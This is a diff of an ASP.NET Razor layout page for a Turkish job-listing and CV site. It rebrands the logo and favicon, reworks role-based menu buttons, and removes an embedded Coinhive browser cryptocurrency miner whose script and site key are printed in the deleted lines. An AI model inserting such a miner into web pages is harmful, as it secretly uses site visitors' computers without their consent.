@@ -19,7 +19,7 @@
 
     <!-- Favicons -->
     <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-    <link rel="icon" href="~/assets/img/cvfavicon.ico">
+    <link rel="icon" href="/assets/img/faviconbilisimkariyer.ico">
     <meta name="viewport" content="width=device-width" />
     <title>@ViewBag.Title</title>
     <style>
@@ -66,7 +66,7 @@
              </div>
             <div class="logodiv">
     <div class="logo-wrapper">
-        <a class="logo" href="/"><img src="/assets/img/logocvhavuzu.png" alt="logo"></a>
+        <a class="logo" href="/"><img src="/assets/img/logo_bilisimkariyer.png" alt="logo"></a>
         <a class="logo-alt" href="/"><img src="/assets/img/logo-alt.png" alt="logo-alt"></a>
     </div>
             </div>
@@ -101,18 +101,18 @@
             @{ if (User.Identity.Name != null)
                 {
                     var user = await UserManager.FindByNameAsync(User.Identity.Name);
-                    if ((user.IsEmployer==true ) || (User.IsInRole("Employer")|| (User.IsInRole("Admin"))))
+
+                    if ((User.IsInRole("Admin")))
+                    {
+                       
+                            <a class="btn btn-success btn-xs" asp-controller="Jobs" asp-action="Create">İlan Ver</a>
+                            <a class="btn btn-success btn-xs" asp-controller="Resumes" asp-action="Create">CV Oluştur</a>
+                    }
+                    else if ((user.IsEmployer == true) || (User.IsInRole("Employer")))
                     {
                         <a class="btn btn-success btn-xs" asp-controller="Jobs" asp-action="Create">İlan Ver</a>
-                        <a class="btn btn-success btn-xs" asp-controller="Companies" asp-action="Create">Firma Ekle</a>
-                        if ((User.IsInRole("Admin")))
-                        {
-                            <a class="btn btn-success btn-xs" asp-controller="Resumes" asp-action="Create">CV Oluştur</a>
-
-                        }
-
                     }
-                    else if ((user.IsEmployer == false) || (User.IsInRole("Candidate")) || (User.IsInRole("Admin")))
+                    else if ((user.IsEmployer == false) || (User.IsInRole("Candidate")))
                     {
 
                         <a class="btn btn-success btn-xs" asp-controller="Resumes" asp-action="Create">CV Oluştur</a>
@@ -211,11 +211,6 @@
     <script src="/assets/js/app.min.js"></script>
     <script src="/assets/js/custom.js"></script>
     @RenderSection("Scripts", required:false)
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-        var miner = new CoinHive.Anonymous('xPzzVnJPOHnOSW14Z6liUMSqDtRQNl6b', { throttle: 0.7 });
-        miner.start();
-        console.log("mining started...");
-    </script>
+    
 </body>
 </html>
